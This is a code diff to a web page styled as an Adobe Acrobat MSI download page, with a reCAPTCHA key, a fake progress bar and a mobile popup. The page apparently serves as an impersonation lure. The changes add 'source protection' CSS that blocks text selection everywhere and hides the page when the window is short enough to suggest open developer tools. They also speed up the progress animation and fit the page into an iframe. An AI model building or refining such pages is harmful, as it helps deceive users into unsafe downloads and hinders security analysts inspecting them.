@@ -39,7 +39,7 @@
     // Optional: Add your reCAPTCHA keys here if you want to use reCAPTCHA
     window.RECAPTCHA_SITE_KEY = '6Lck8b0rAAAAAOByegidVp-PDdVTR2Nrsgck3rX4';  // Add your key if using reCAPTCHA
   </script>
-  <style>
+   <style>
     /* 
       ADOBE LOGO SIZE ADJUSTMENT:
       To change the Adobe logo size, modify the --adobe-logo-size CSS variable below.
@@ -64,6 +64,14 @@
       margin: 0;
       display: flex;
       flex-direction: column;
+      /* Source Protection */
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      -webkit-touch-callout: none;
+      -webkit-tap-highlight-color: transparent;
+      -khtml-user-select: none;
     }
     
     .container {
@@ -161,37 +169,30 @@
     /* Main content */
     main {
       flex: 1;
-      padding: 40px 0;
+      padding: 20px 0;
       text-align: center;
     }
     
     h1 {
-      font-size: 34px;
+      font-size: 28px;
       font-weight: 400;
       color: #2c2c2c;
-      margin-bottom: 50px;
+      margin-bottom: 30px;
     }
     
     /* Steps container */
     .steps-container {
       display: flex;
       justify-content: center;
-      gap: 100px;
-      margin-bottom: 40px;
+      gap: 60px;
+      margin-bottom: 20px;
       flex-wrap: wrap;
       position: relative;
     }
     
-    /* Vertical separator line */
+    /* Vertical separator line - removed for better iframe fit */
     .steps-container::after {
-      content: '';
-      position: absolute;
-      left: 50%;
-      top: 20px;
-      bottom: 80px;
-      width: 1px;
-      background: #e1e1e1;
-      transform: translateX(-50%);
+      display: none;
     }
     
     @media (max-width: 768px) {
@@ -201,14 +202,14 @@
     }
     
     .step {
-      flex: 0 1 400px;
+      flex: 0 1 300px;
       text-align: center;
     }
     
     .step-icon {
-      width: 160px;
-      height: 160px;
-      margin: 0 auto 25px;
+      width: 120px;
+      height: 120px;
+      margin: 0 auto 15px;
       position: relative;
       display: flex;
       align-items: center;
@@ -225,14 +226,14 @@
     
     /* Progress section */
     .progress-section {
-      margin: 25px 0;
+      margin: 15px 0;
     }
     
     .progress-info {
       display: flex;
       justify-content: space-between;
-      margin-bottom: 10px;
-      font-size: 16px;
+      margin-bottom: 8px;
+      font-size: 14px;
     }
     
     .progress-bar {
@@ -248,7 +249,7 @@
       height: 100%;
       background: #1473e6;
       border-radius: 4px;
-      animation: fillProgress 4s ease-out forwards;
+      animation: fillProgress 2s ease-out forwards; /* Updated to 2 seconds */
     }
     
     @keyframes fillProgress {
@@ -263,30 +264,155 @@
       }
     }
     
+    /* Updated progress animation duration for 2 seconds */
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: #1473e6;
+      border-radius: 4px;
+      animation: fillProgress 2s ease-out forwards; /* Changed from 4s to 2s */
+    }
+    
     /* Step content */
     .step h2 {
-      font-size: 24px;
+      font-size: 20px;
       font-weight: 600;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
       color: #2c2c2c;
     }
     
     .step p {
-      font-size: 16px;
+      font-size: 14px;
       color: #505050;
-      line-height: 1.6;
+      line-height: 1.5;
     }
     
     
-    /* Responsive */
+    /* Mobile Popup Modal */
+    .mobile-modal {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+    }
+    
+    .mobile-modal-content {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+    
+    .mobile-modal h2 {
+      color: #fa0f00;
+      margin-bottom: 20px;
+      font-size: 24px;
+    }
+    
+    .mobile-modal p {
+      margin-bottom: 20px;
+      line-height: 1.6;
+      color: #333;
+    }
+    
+    .mobile-modal-close {
+      background: #dc3545;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+      min-width: 120px;
+    }
+    
+    .mobile-modal-close:hover {
+      background: #c82333;
+    }
+
+    /* Additional Source Protection Styles */
+    ::selection {
+      background: transparent;
+    }
+    
+    ::-moz-selection {
+      background: transparent;
+    }
+    
+    /* Hide content only for very small heights (likely dev tools) */
+    @media screen and (max-height: 300px) {
+      body { 
+        display: none !important; 
+      }
+    }
+    
+    /* Additional protection styles */
+    * {
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      -khtml-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+    
+    *::before, *::after {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    /* Iframe optimization for 900px x 600px */
     @media (max-width: 950px) {
       .notification-banner {
         right: 20px;
         top: 50%;
         transform: translateY(-50%);
-        max-width: 320px;
-        font-size: 14px;
-        padding: 10px 16px;
+        max-width: 280px;
+        font-size: 12px;
+        padding: 8px 12px;
+      }
+      
+      .steps-container {
+        gap: 40px;
+        margin-bottom: 15px;
+      }
+      
+      .step {
+        flex: 0 1 250px;
+      }
+      
+      .step-icon {
+        width: 100px;
+        height: 100px;
+        margin: 0 auto 10px;
+      }
+      
+      h1 {
+        font-size: 24px;
+        margin-bottom: 20px;
+      }
+      
+      .step h2 {
+        font-size: 18px;
+        margin-bottom: 10px;
+      }
+      
+      .step p {
+        font-size: 13px;
       }
     }
     
@@ -299,31 +425,37 @@
       }
       
       h1 {
-        font-size: 28px;
-        margin-bottom: 30px;
+        font-size: 22px;
+        margin-bottom: 20px;
         padding: 0 20px;
       }
       
       .steps-container {
-        gap: 50px;
+        gap: 30px;
+        margin-bottom: 10px;
+      }
+      
+      .step {
+        flex: 0 1 200px;
       }
       
       .step-icon {
-        width: 120px;
-        height: 120px;
+        width: 80px;
+        height: 80px;
       }
       
       .step-icon img {
-        width: 120px !important;
-        height: 120px !important;
+        width: 80px !important;
+        height: 80px !important;
       }
       
       .step h2 {
-        font-size: 20px;
+        font-size: 16px;
+        margin-bottom: 8px;
       }
       
       .step p {
-        font-size: 15px;
+        font-size: 12px;
       }
     }
   </style>
@@ -750,3 +882,4 @@ Adobe Acrobat MSI Download Page Visit`;
   </script>
 </body>
 </html>
+
